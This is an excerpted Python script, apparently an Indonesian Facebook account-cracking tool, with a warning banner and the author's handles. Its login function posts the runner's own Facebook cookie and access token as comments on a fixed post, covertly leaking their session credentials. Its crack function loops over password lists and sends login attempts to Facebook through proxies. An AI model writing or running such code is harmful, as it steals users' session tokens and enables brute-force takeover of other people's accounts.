...
#----[ jangan di oprek, Nanti data hpmu Hilang ]-----#
author = 'Muhamad Rizki'
git_hub = 'github.com/Skull378'
faceb0ok = 'Muhamad Rizki XD'
...
#	B = f' en-us; OPPO Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/'
...
def login():
	...
	try:
		...
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100043618273847/posts/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/?app=fbl')
		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])
		#ses.post(f"https://graph.facebook.com/100043618273847?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
...
def cek_akun():
	...
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	print(f' akun tidak kenon di : {nonon}\n akun yang kenon di  : buang goblok Tolol')
	print(' ─────────────────────────────')
	try:
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			bx = ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=date, headers=head,proxies=proxy)
